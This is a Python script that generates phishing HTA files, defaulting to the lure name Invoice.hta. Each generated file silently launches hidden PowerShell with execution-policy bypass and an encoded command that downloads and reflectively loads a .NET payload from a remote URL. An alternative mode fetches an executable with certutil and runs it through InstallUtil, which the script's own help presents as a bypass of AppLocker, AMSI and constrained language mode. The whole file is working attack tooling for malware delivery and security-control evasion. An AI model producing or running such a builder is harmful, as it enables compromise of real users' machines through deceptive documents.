#!/usr/bin/env python3

import argparse
import base64
import sys
from pathlib import Path


PS_X64 = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
PS_X86 = r"C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"

INSTALLUTIL_X64 = r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe"
INSTALLUTIL_X86 = r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe"


HTA_TEMPLATE_PS = """<html>
<head>
<title>{title}</title>
<HTA:APPLICATION APPLICATIONNAME="{title}" SHOWINTASKBAR="no" SINGLEINSTANCE="yes" WINDOWSTATE="minimize" BORDER="none" CAPTION="no" />
<script language="JScript">
try {{
    var s = new ActiveXObject("WScript.Shell");
    s.Run('"{ps_exe}" -w hidden -ep bypass -nop -enc {enc}', 0, false);
}} catch(e) {{}}
window.close();
</script>
</head>
<body></body>
</html>
"""


HTA_TEMPLATE_INSTALLUTIL = """<html>
<head>
<title>{title}</title>
<HTA:APPLICATION APPLICATIONNAME="{title}" SHOWINTASKBAR="no" SINGLEINSTANCE="yes" WINDOWSTATE="minimize" BORDER="none" CAPTION="no" />
<script language="JScript">
try {{
    var sh = new ActiveXObject("WScript.Shell");
    var dst = sh.ExpandEnvironmentStrings("%TEMP%") + "\\\\{drop_name}";
    sh.Run('cmd.exe /c certutil -urlcache -split -f "{url}" "' + dst + '" >nul 2>&1', 0, true);
    sh.Run('"{installutil}" /logfile= /LogToConsole=false /U "' + dst + '"', 0, false);
}} catch(e) {{}}
window.close();
</script>
</head>
<body></body>
</html>
"""


def js_escape(s: str) -> str:
    return s.replace('\\', '\\\\').replace("'", "\\'")


def build_ps_inmem(url: str) -> str:
    return (
        f"$b=(New-Object Net.WebClient).DownloadData('{url}');"
        f"$a=[Reflection.Assembly]::Load($b);"
        f"$a.EntryPoint.Invoke($null,(,[string[]]@()))"
    )


def encode_ps(script: str) -> str:
    return base64.b64encode(script.encode('utf-16-le')).decode()


def main():
    ap = argparse.ArgumentParser(
        description="Build phishing .hta (PowerShell Reflection.Load or InstallUtil chain)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
EXAMPLES:

  PowerShell Reflection.Load (default):
    python3 build_hta.py --url http://192.168.x.x/loader.exe

  InstallUtil chain (AppLocker/AMSI/CLM bypass):
    python3 build_hta.py --url http://192.168.x.x/Update.exe --installutil

  x86 payload:
    python3 build_hta.py --url http://192.168.x.x/loader.exe --x86
        """,
    )
    ap.add_argument("--url", required=True,
                    help="URL of the .NET loader .exe to download/execute")
    ap.add_argument("-o", "--output", default="Invoice.hta",
                    help="Output .hta filename (default: Invoice.hta)")
    ap.add_argument("--title", default="Document", help="HTA window title")
    ap.add_argument("--x86", action="store_true",
                    help="Use 32-bit PowerShell/InstallUtil")
    ap.add_argument("--installutil", action="store_true",
                    help="InstallUtil chain instead of PowerShell Reflection.Load. "
                         "HTA downloads .exe to %%TEMP%% and runs InstallUtil.exe /U.")
    ap.add_argument("--drop-name", default="update.exe",
                    help="Filename for the dropped .exe in %%TEMP%% (InstallUtil mode)")
    args = ap.parse_args()

    if args.installutil:
        installutil = INSTALLUTIL_X86 if args.x86 else INSTALLUTIL_X64
        hta = HTA_TEMPLATE_INSTALLUTIL.format(
            title=args.title,
            url=args.url,
            drop_name=args.drop_name,
            installutil=js_escape(installutil),
        )
        chain = f"InstallUtil /U  ->  %TEMP%\\{args.drop_name}"
    else:
        ps = build_ps_inmem(args.url)
        enc = encode_ps(ps)
        ps_exe = PS_X86 if args.x86 else PS_X64
        hta = HTA_TEMPLATE_PS.format(
            title=args.title,
            ps_exe=js_escape(ps_exe),
            enc=enc,
        )
        chain = f"PowerShell Reflection.Load ({len(enc)} char b64)"

    out = Path(args.output)
    out.write_text(hta)

    print(f"[+] HTA:    {out} ({len(hta)} bytes)")
    print(f"[+] Arch:   {'x86' if args.x86 else 'x64'}")
    print(f"[+] Chain:  {chain}")
    print(f"[+] Loader: {args.url}")


if __name__ == "__main__":
    main()
